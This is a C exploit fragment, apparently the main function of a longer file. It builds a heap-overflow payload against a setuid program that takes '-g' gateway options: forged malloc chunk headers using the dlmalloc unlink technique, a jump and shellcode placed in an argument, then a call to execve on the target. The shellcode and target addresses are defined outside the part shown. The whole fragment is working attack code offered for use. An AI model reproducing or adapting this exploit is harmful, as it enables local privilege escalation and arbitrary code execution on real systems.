int main()
{
	char		gateway[ 1337 ];
	char		host[ 1337 ];
	char *		argv[] = { filename, "-g", "123", "-g", gateway, host, NULL };
	unsigned int	next;
	int		i;
	unsigned int	hellcode;
	unsigned int	size;

	strcpy( host, "AAAABBBBCCCCDDDDEEEE" );
	next = stack - (strlen(filename) + 1) - (strlen(host) + 1) + strlen("AAAA");
	for ( i = 0; i < next - (next & ~3); i++ ) {
		strcat( host, "X" );
	}
	next = next & ~3;

	((unsigned int *)host)[1] = 0xffffffff & ~PREV_INUSE;
	((unsigned int *)host)[2] = 0xffffffff;
	if ( zero( victim - 12 ) ) {
		fprintf( stderr, "Null byte(s) in `victim - 12' (0x%08x)!\n", victim - 12 );
		return( -1 );
	}
	((unsigned int *)host)[3] = victim - 12;
	hellcode = p + (strlen("123") + 1) + strlen("0x42.0x42.0x42.0x42") + strlen(" ");
	if ( zero( hellcode ) ) {
		fprintf( stderr, "Null byte(s) in `host' (0x%08x)!\n", hellcode );
		return( -1 );
	}
	((unsigned int *)host)[4] = hellcode;

	size = next - (p - 4);
	size = size | PREV_INUSE;
	sprintf(
		gateway,
		"0x%02x.0x%02x.0x%02x.0x%02x",
		((unsigned char *)(&size))[0],
		((unsigned char *)(&size))[1],
		((unsigned char *)(&size))[2],
		((unsigned char *)(&size))[3]
	);

	strcat( gateway, " " );
	strcat( gateway, jmp );
	strcat( gateway, shellcode );
	strcat( gateway, program );

	hellcode += strlen(jmp) + strlen(shellcode);
	if ( zero( hellcode ) ) {
		fprintf( stderr, "Null byte(s) in `gateway' (0x%08x)!\n", hellcode );
		return( -1 );
	}
	*((unsigned int *)(gateway + strlen("0x42.0x42.0x42.0x42") + strlen(" ") + strlen(jmp) + 7)) = hellcode;

	hellcode += strlen(program) + 1;
	if ( zero( hellcode ) ) {
		fprintf( stderr, "Null byte(s) in `gateway' (0x%08x)!\n", hellcode );
		return( -1 );
	}
	*((unsigned int *)(gateway + strlen("0x42.0x42.0x42.0x42") + strlen(" ") + strlen(jmp) + 12)) = hellcode;

	execve( argv[0], argv, NULL );
	return( -1 );
}